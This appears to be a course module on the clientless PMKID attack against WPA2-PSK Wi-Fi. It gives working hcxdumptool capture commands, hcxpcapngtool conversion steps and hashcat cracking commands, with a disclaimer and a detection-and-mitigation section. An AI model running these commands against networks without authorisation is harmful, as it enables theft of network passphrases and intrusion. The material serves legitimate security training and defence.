# Module 12 — PMKID Attack (Clientless WPA2 Cracking)

> **Prerequisites:** [Module 07 — WPA2 Cracking](../module-07-wpa2-cracking/)
> **Next Module:** [Module 13 — WPA2/WPA3-Enterprise Attacks](../module-13-enterprise-wpa/)

> **Legal Disclaimer:** The PMKID attack must only be performed on networks you own or have **explicit written authorization** to test. Capturing and cracking network credentials without authorization is illegal under the CFAA, UK Computer Misuse Act, and equivalent laws worldwide.

---

## Table of Contents

1. [What Is the PMKID?](#1-what-is-the-pmkid)
2. [Why PMKID Cracking Is Revolutionary](#2-why-pmkid-cracking-is-revolutionary)
3. [PMKID Derivation — The Math](#3-pmkid-derivation--the-math)
4. [Capturing the PMKID with hcxdumptool](#4-capturing-the-pmkid-with-hcxdumptool)
5. [Converting Captures with hcxtools](#5-converting-captures-with-hcxtools)
6. [Cracking with hashcat (Mode 22000)](#6-cracking-with-hashcat-mode-22000)
7. [Targeted PMKID Capture](#7-targeted-pmkid-capture)
8. [Combining PMKID with EAPOL Capture](#8-combining-pmkid-with-eapol-capture)
9. [PMKID vs. Traditional Handshake — Comparison](#9-pmkid-vs-traditional-handshake--comparison)
10. [Detection & Countermeasures](#10-detection--countermeasures)
11. [Knowledge Check](#11-knowledge-check)

---

## 1. What Is the PMKID?

### Background

The **PMKID** (Pairwise Master Key Identifier) is a 128-bit value included in the **first EAPOL frame** of the WPA2 4-way handshake. It was introduced in the 802.11i amendment to allow fast BSS transition (roaming) — letting clients re-use a cached PMK without re-authenticating to RADIUS.

The critical discovery was made by **Jens Steube** (hashcat author) in **August 2018**: the PMKID is derived directly from the PMK, the AP's MAC address, and the client's MAC address. Since the PMK itself is derived from the WPA2 passphrase, the PMKID can be cracked offline in exactly the same way as an EAPOL handshake — **but without needing a client to be present at all**.

### Where the PMKID Appears

```
802.11 Association Request / EAPOL Frame 1 (ANonce)
└── RSN Information Element
    └── PMKID List
        └── PMKID[0] = <16 bytes>  ← this is what we extract
```

The AP includes the PMKID in the very first frame of the 4-way handshake, before any client authentication occurs. An attacker can request this frame by simply **associating with the AP** — no connected clients, no deauthentication needed.

---

## 2. Why PMKID Cracking Is Revolutionary

### The Traditional Handshake Problem

The classic WPA2 cracking workflow (Module 06/07) requires:

1. A **connected client** on the target network
2. A **deauthentication attack** to force the client to reconnect
3. Capturing the **4-way EAPOL handshake** during reconnection
4. Cracking the captured handshake offline

This workflow fails when:
- No clients are connected (empty network, off-hours)
- The AP implements 802.11w (encrypted management frames block deauth)
- The environment is monitored and deauth attacks are detected

### The PMKID Solution

PMKID cracking needs:

1. Just the **AP** (no clients required)
2. A single **association attempt** (one frame exchange)
3. The **PMKID** extracted from the AP's response

```
Traditional:   Attacker ──deauth──► Client ──reconnect──► AP ──capture handshake
                                                                      │
PMKID:         Attacker ──associate──► AP ──PMKID in response──►  extract & crack
```

### What Does Not Change

PMKID cracking is still an **offline dictionary/brute-force attack** against the WPA2 passphrase. It does **not** bypass the passphrase — it simply removes the need for a connected client.

---

## 3. PMKID Derivation — The Math

### PMK Derivation (same as standard WPA2)

```
PMK = PBKDF2-HMAC-SHA1(passphrase, SSID, 4096 iterations, 256 bits)
```

This is identical to standard WPA2-PSK key derivation. The passphrase and SSID together produce the PMK.

### PMKID Formula

```
PMKID = HMAC-SHA1-128(PMK, "PMK Name" || AP_MAC || Client_MAC)
```

Where:
- `PMK` — the 256-bit Pairwise Master Key (derived from passphrase + SSID)
- `"PMK Name"` — the literal ASCII string `PMK Name` (8 bytes)
- `AP_MAC` — the BSSID of the AP (6 bytes)
- `Client_MAC` — the MAC of the connecting station (6 bytes)
- `HMAC-SHA1-128` — first 128 bits (16 bytes) of the HMAC-SHA1 output

### Why This Is Crackable

Since the attacker knows:
- `AP_MAC` — from the beacon frame (public)
- `Client_MAC` — the attacker's own MAC (known)
- `"PMK Name"` — constant string (known)
- The captured `PMKID` — from the association response

They can compute:
```
for each candidate_passphrase in wordlist:
    PMK_candidate = PBKDF2-HMAC-SHA1(candidate_passphrase, SSID, 4096, 256)
    PMKID_candidate = HMAC-SHA1-128(PMK_candidate, "PMK Name" || AP_MAC || Client_MAC)
    if PMKID_candidate == captured_PMKID:
        found! passphrase = candidate_passphrase
```

This is computationally identical to cracking a WPA2 handshake — hashcat mode **22000** handles both.

---

## 4. Capturing the PMKID with hcxdumptool

`hcxdumptool` is the primary tool for PMKID and EAPOL capture. It is more efficient than `airodump-ng` for this purpose and supports targeted, clientless capture.

### Installation

```bash
sudo apt install hcxdumptool hcxtools

# Or build from source for the latest version:
git clone https://github.com/ZerBea/hcxdumptool.git
cd hcxdumptool && make && sudo make install
```

### Preparing the Interface

`hcxdumptool` manages the interface itself — do **not** put it in monitor mode manually:

```bash
# Stop NetworkManager and wpa_supplicant first
sudo systemctl stop NetworkManager wpa_supplicant

# hcxdumptool will handle the interface mode internally
```

### Basic PMKID Capture

```bash
sudo hcxdumptool -i wlan0 -o capture.pcapng --enable_status=1

# -i wlan0          Interface (NOT monitor mode — hcxdumptool handles it)
# -o capture.pcapng Output file in pcapng format
# --enable_status=1 Print status to stdout
```

### hcxdumptool Status Output

```
[15:42:01 - 001] b4:fb:e4:aa:bb:cc [FOUND PMKID] MyHomeNetwork
[15:42:03 - 002] a0:21:b7:cc:dd:ee [FOUND PMKID] NeighborNet
[15:42:07 - 003] fc:ec:da:11:22:33 [FOUND EAPOL] CoffeeShop
```

| Tag | Meaning |
|-----|---------|
| `FOUND PMKID` | PMKID extracted — no client needed |
| `FOUND EAPOL` | Full 4-way handshake captured — client was present |
| `FOUND PMKID/EAPOL` | Both captured in same session |

### Stopping Capture

```bash
# Ctrl+C to stop hcxdumptool
# Restart NetworkManager after capture
sudo systemctl start NetworkManager
```

---

## 5. Converting Captures with hcxtools

The raw `pcapng` capture file must be converted to hashcat's **hash format 22000** before cracking.

### hcxpcapngtool (hcxtools ≥ 6.0)

```bash
# Convert pcapng to hashcat 22000 format
hcxpcapngtool -o hashes.hc22000 capture.pcapng

# View what was extracted
hcxpcapngtool -o hashes.hc22000 capture.pcapng --all_ap

# Expected output:
# summary capture file
#
# file name                 : capture.pcapng
# version magic             : 0xa0d0d0a
# networks detected         : 14
# networks with PMKID       : 11
# networks with EAPOL       : 3
```

### Legacy hcxpcaptool (hcxtools < 6.0)

```bash
# Older syntax still works on some distributions
hcxpcaptool -z hashes.hc22000 capture.pcapng
```

### Inspecting the Hash File

```bash
cat hashes.hc22000

# Hash format (one per line):
# WPA*01*<PMKID>*<AP_MAC>*<Client_MAC>*<SSID_hex>*<message_pair>
# Example:
# WPA*01*4d4fe7aac3a2cecab195321ccd5, b4fbe4aabbcc*<client_mac>*4d7948...
```

### Filtering by SSID or BSSID

```bash
# Extract only PMKID hashes (type 01), not EAPOL (type 02)
grep "WPA\*01\*" hashes.hc22000 > pmkid_only.hc22000

# Filter by SSID (hex-encoded)
# First, get hex of target SSID:
echo -n "MyHomeNetwork" | xxd -p
# → 4d79486f6d654e6574776f726b

grep "4d79486f6d654e6574776f726b" hashes.hc22000 > target.hc22000
```

---

## 6. Cracking with hashcat (Mode 22000)

Hashcat mode **22000** handles both PMKID (type 01) and EAPOL (type 02) hashes from the same hash file. This is the unified WPA/WPA2 cracking mode introduced in hashcat 6.0.

### Dictionary Attack

```bash
hashcat -m 22000 hashes.hc22000 /usr/share/wordlists/rockyou.txt

# -m 22000  WPA-PBKDF2-PMKID+EAPOL (unified mode)
# GPU acceleration used automatically if available
```

### Rule-Based Attack

```bash
hashcat -m 22000 hashes.hc22000 /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Applies transformations: capitalize, add digits, l33tspeak, etc.
```

### Mask Attack (Brute Force with Pattern)

```bash
# 8-digit numeric PIN (common default passwords)
hashcat -m 22000 hashes.hc22000 -a 3 ?d?d?d?d?d?d?d?d

# 8-char mixed (upper + lower + digit)
hashcat -m 22000 hashes.hc22000 -a 3 ?u?l?l?l?l?l?d?d

# Hybrid: wordlist + 4-digit suffix
hashcat -m 22000 hashes.hc22000 -a 6 rockyou.txt ?d?d?d?d
```

### Monitoring Progress

```bash
# During cracking, press 's' for status:
# Session..........: hashcat
# Status...........: Running
# Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
# Hash.Target......: hashes.hc22000
# Recovered........: 0/11 (0.00%)
# Speed.#1.........: 42000 H/s (GPU)
# Progress.........: 1234000/14344384 (8.60%)

# View cracked passwords
hashcat -m 22000 hashes.hc22000 --show
```

### Performance Expectations

| Hardware | Speed (WPA2/22000) |
|----------|-------------------|
| CPU only (i7) | ~2,000 H/s |
| GTX 1080 Ti | ~310,000 H/s |
| RTX 3090 | ~680,000 H/s |
| RTX 4090 | ~1,200,000 H/s |
| 8× A100 cluster | ~6,000,000 H/s |

PBKDF2 with 4096 iterations is intentionally slow. `rockyou.txt` (14M passwords) takes ~2 minutes on an RTX 4090.

---

## 7. Targeted PMKID Capture

For a specific target AP, use `hcxdumptool` filters to reduce noise and capture only the desired PMKID.

### Create a Filter File

```bash
# filterlist_ap.txt — one BSSID per line (no colons)
echo "aabbccddeeff" > filterlist_ap.txt

# Or create from airodump-ng scan:
sudo airodump-ng wlan0mon --output-format csv -w scan
# Then extract BSSIDs:
awk -F',' 'NR>2 && $1!="" {gsub(/ /,"",$1); print tolower($1)}' scan-01.csv > filterlist_ap.txt
```

### Targeted hcxdumptool Capture

```bash
sudo hcxdumptool -i wlan0 \
  -o target_capture.pcapng \
  --filterlist_ap=filterlist_ap.txt \
  --filtermode=2 \
  --enable_status=1

# --filterlist_ap   Only interact with APs in this list
# --filtermode=2    Whitelist mode (only listed APs)
# --filtermode=1    Blacklist mode (skip listed APs)
```

### Sending Association Requests Aggressively

```bash
# hcxdumptool with active probing — requests PMKIDs faster
sudo hcxdumptool -i wlan0 \
  -o capture.pcapng \
  --filterlist_ap=filterlist_ap.txt \
  --filtermode=2 \
  --active_beacon \
  --enable_status=3

# --active_beacon   Send probe requests to trigger PMKID responses
# --enable_status=3 Most verbose status output
```

---

## 8. Combining PMKID with EAPOL Capture

`hcxdumptool` captures both PMKIDs and full EAPOL handshakes in the same session. Using both increases crack chances when only one type is available per network.

```bash
# Single session captures everything
sudo hcxdumptool -i wlan0 -o combined.pcapng --enable_status=3

# Convert — hcxpcapngtool extracts both automatically
hcxpcapngtool -o combined.hc22000 combined.pcapng

# Hash file contains both WPA*01* (PMKID) and WPA*02* (EAPOL) lines
# hashcat -m 22000 handles both simultaneously
hashcat -m 22000 combined.hc22000 rockyou.txt
```

### Verifying Hash Quality

```bash
# Check how many hashes were captured and their types
hcxpcapngtool combined.pcapng --all_ap 2>&1 | grep -E "PMKID|EAPOL|total"

# Alternatively use hcxhashtool for analysis
hcxhashtool -i combined.hc22000 --info=stdout
```

---

## 9. PMKID vs. Traditional Handshake — Comparison

| Attribute | PMKID Attack | 4-Way Handshake |
|-----------|-------------|-----------------|
| Client required | **No** | Yes |
| Deauthentication needed | **No** | Usually yes |
| Capture frames needed | 1 (association response) | 4 (EAPOL M1–M4) |
| Works with 802.11w (MFP) | **Yes** | Partially blocked |
| hashcat mode | 22000 | 22000 (same) |
| Crack speed | Identical | Identical |
| AP must support PMKID | Required (most modern APs) | No |
| Detection footprint | Low (single association) | Higher (deauth burst) |

### When to Use Each

```
├── Target AP supports PMKID (most WPA2-PSK APs post-2018)
│   └── Use PMKID — no clients, no deauth, lower detection
│
├── Target AP does not return PMKID (some older firmware)
│   └── Fall back to EAPOL handshake capture (Module 06)
│
└── Both available in capture file
    └── Submit both — hashcat cracks whichever it finds first
```

---

## 10. Detection & Countermeasures

### How Defenders Detect PMKID Attacks

| Indicator | Method |
|-----------|--------|
| Rapid association requests from unknown MAC | WIDS alert on association flood |
| MAC address not in client whitelist | 802.1X / MAC ACL enforcement |
| Association without subsequent data traffic | Anomaly detection |
| Repeated associations from same MAC | Log analysis / SIEM |

### Mitigations

| Mitigation | Effect |
|-----------|--------|
| Strong, long, random passphrase | Makes cracking computationally infeasible |
| WPA3-SAE (Dragonfly) | PMKID cracking does not apply to SAE |
| MAC address filtering | Speed bump (easily bypassed via spoofing) |
| 802.1X (WPA2-Enterprise) | PMKID attack irrelevant — no PSK to crack |
| Monitor association logs | Detect unusual clients |

### The Only Real Fix

The PMKID is a protocol feature — it cannot be disabled without breaking WPA2 fast roaming. The actual defense is:

```
Use WPA3-SAE, which derives session keys using Simultaneous Authentication
of Equals (SAE / Dragonfly). The handshake is not vulnerable to offline
dictionary attacks because the PMK is never derivable from just the
passphrase + public data.
```

Or use a **passphrase of sufficient entropy**:

```bash
# Generate a strong random passphrase
openssl rand -base64 24
# Example: Xk9mP2qL7nRjT4vB8wCe1A==

# At 10M guesses/second, a 24-char random base64 string would take:
# 10^35 years to crack exhaustively
```

---

## 11. Knowledge Check

Before proceeding to Module 13, you should be able to answer:

1. What is the PMKID and in which 802.11 frame does the AP include it?
2. Write the full PMKID derivation formula, identifying each input component.
3. Why does PMKID cracking not require a connected client, unlike traditional WPA2 handshake capture?
4. What is the primary `hcxdumptool` command to capture PMKIDs from all nearby APs, and what format does it output?
5. What `hcxpcapngtool` command converts a `pcapng` capture to hashcat format 22000?
6. Write the hashcat command to run a rule-based attack against `hashes.hc22000` using `rockyou.txt` and the `best64.rule` ruleset.
7. What is the difference between `WPA*01*` and `WPA*02*` lines in a `.hc22000` hash file?
8. How does `hcxdumptool --filtermode=2` differ from `--filtermode=1`, and why would you use whitelisting?
9. Why is PMKID cracking equally as computationally expensive as cracking a traditional WPA2 handshake?
10. What is the only protocol-level countermeasure that makes PMKID attacks irrelevant, and why?

---

**Next:** [Module 13 — WPA2/WPA3-Enterprise Attacks](../module-13-enterprise-wpa/)
